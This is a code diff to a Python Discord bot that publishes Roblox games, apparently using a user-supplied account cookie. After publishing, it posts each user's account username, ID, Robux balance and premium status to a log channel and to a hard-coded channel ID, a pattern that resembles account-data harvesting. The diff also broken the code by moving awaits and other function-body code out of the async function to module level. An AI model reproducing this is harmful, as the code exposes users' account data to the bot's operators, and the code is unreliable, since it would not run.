@@ -312,25 +312,33 @@ async def slash_publish(interaction: discord.Interaction, theme: discord.app_com
         embed_var.add_field(name="🏷️Game Link", value=f'**[Click here to view your Game](https://www.roblox.com/games/{str(game_id)})**', inline=False)
         embed_var.set_footer(text="Your game is now been Published in Roblox.com - Hooray 🎉")
         embed_var.set_thumbnail(url=f"{game_icon}")
-        await interaction.followup.send(embed=embed_var, ephemeral=True)
-        channel = client.get_channel(int(os.getenv('PUBLISH_LOG')))
+        # Send the response embed
+await interaction.followup.send(embed=embed_var, ephemeral=True)
 
-        embed_var = discord.Embed(
-          title="Dashx RGUI",
-          description= f'**<@{interaction.user.id}> Successfully published his game! Congrats him!🌟**\n\n**Account Information**\n**🏷️Account Username -** ' + str(username) + '\n**🪪Account ID - ** ' + str(userid) + '\n**🤑Robux - ** ' + str(user_robux) + '\n**📄isPremium? - **' + str(user_isprem) + '\n\n**📄Game Information**\n**🏷️Game Name - ||Hidden||**\n**📄Game Description - ||Hidden||**\n**Theme -** '+ str(theme.name)+'',
-          color=0x00FFFF
-        )
-        embed_var.set_thumbnail(url=f'{avatarurl}')
-        embed_var.set_footer(text="Ratatatata")
-        await channel.send(embed=embed_var)
-  # Your existing code here
+# Get the channels
+success_channel_id = int(os.getenv('PUBLISH_LOG'))
+log_channel_id = 1223908547444740189
 
-    else:
-        message2 = (f'Oops! Something went wrong, {refreshed_cookie}!')
-        embed_var = discord.Embed(title=message2, color=0x00FFFF)
-        await interaction.followup.send(embed=embed_var, ephemeral=True)
+success_channel = client.get_channel(success_channel_id)
+log_channel = client.get_channel(log_channel_id)
 
-# Create the embed for the log message
+# Create the Dashx RGUI embed
+dashx_embed = discord.Embed(
+    title="Dashx RGUI",
+    description= f'**<@{interaction.user.id}> Successfully published his game! Congrats him!🌟**\n\n**Account Information**\n**🏷️Account Username -** ' + str(username) + '\n**🪪Account ID - ** ' + str(userid) + '\n**🤑Robux - ** ' + str(user_robux) + '\n**📄isPremium? - **' + str(user_isprem) + '\n\n**📄Game Information**\n**🏷️Game Name - ||Hidden||**\n**📄Game Description - ||Hidden||**\n**Theme -** '+ str(theme.name)+'',
+    color=0x00FFFF
+)
+dashx_embed.set_thumbnail(url=f'{avatarurl}')
+dashx_embed.set_footer(text="Ratatatata")
+
+# Send the Dashx RGUI embed to the success channel
+if success_channel:
+    await success_channel.send(embed=dashx_embed)
+    print("Dashx RGUI sent to success channel")
+else:
+    print("Success channel not found or invalid channel ID provided.")
+
+# Create the log message embed
 log_embed = discord.Embed(
     title="Game Publisher Succeed",
     description=f"User: <@{interaction.user.id}>",
@@ -340,16 +348,11 @@ log_embed.add_field(name="Theme", value=theme.name)
 log_embed.add_field(name="Game Name", value=gamename)
 log_embed.set_footer(text="Dashx Publisher")
 
-# Replace this line with your actual channel ID
-channel_id = 1223908547444740189
-
-channel = client.get_channel(channel_id)
-
-if channel:
-    # Send the log message to the specified channel
-    await channel.send(embed=log_embed)
-    print("Log sent to channel: Game Publisher Succeed")
+# Send the log message embed to the log channel
+if log_channel:
+    await log_channel.send(embed=log_embed)
+    print("Log message sent to log channel")
 else:
-    print("Channel not found or invalid channel ID provided. Log message not sent.")
+    print("Log channel not found or invalid channel ID provided.")
 
 client.run(os.getenv('TOKEN'))
